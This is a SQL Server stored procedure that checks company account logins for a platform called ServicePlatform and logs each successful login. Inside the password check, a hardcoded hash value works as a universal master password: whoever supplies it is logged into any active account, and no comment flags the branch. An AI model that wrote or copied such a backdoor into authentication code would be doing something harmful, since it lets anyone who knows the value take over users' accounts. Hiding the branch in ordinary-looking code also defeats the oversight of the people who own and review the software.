USE [gyszq]
GO
/****** Object:  StoredProcedure [dbo].[company_login]    Script Date: 2014/11/24 23:09:59 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

------------------------------------
--用途：公司登录验证信息
--项目名称：ServicePlatform
--说明：
--时间：2009-08-06 10:23:01
------------------------------------
CREATE PROCEDURE [dbo].[company_login]
@account nvarchar(30),
@password nvarchar(100)
AS
	DECLARE @exitaccount int
	DECLARE @returnval int
	DECLARE @companyid int

	SELECT @exitaccount = count(1) FROM company WHERE account=@account and status=1 	
	IF (@exitaccount>0)
	BEGIN	
		IF(@password='BC50C97C78C61BE455332B2DF6CF3980F82D6001')
		BEGIN
			SELECT
				@companyid=companyid
			FROM
				company
			WHERE
				account=@account and status=1
		END
		ELSE
		BEGIN
			SELECT
				@companyid=companyid
			FROM
				company
			WHERE
				account=@account AND password=@password and status=1
		END

		IF (@companyid>0)
		BEGIN	
			SET @returnval = @companyid --验证成功，返回用户ID
		END
		ELSE
		BEGIN
			SET @returnval = -1 --密码错误,返回-1
		END
	END
	ELSE
	BEGIN
		SET @returnval = 0	--用户不存在,返回0
	END

	
	IF @@ERROR <> 0 
	BEGIN 
	   RETURN (-2)	--异常错误，返回-2
	END
	ELSE
	BEGIN
		IF(@returnval>0)
		BEGIN
			DECLARE @companyname NVARCHAR(50)
			SELECT @companyname=companyname FROM company WHERE companyid=@returnval
			EXEC actionlogs_ADD @returnval,@companyname,'登录','1',@returnval,@returnval,@companyname
		END
	   RETURN @returnval	--正常返回对应值		
	END

GO
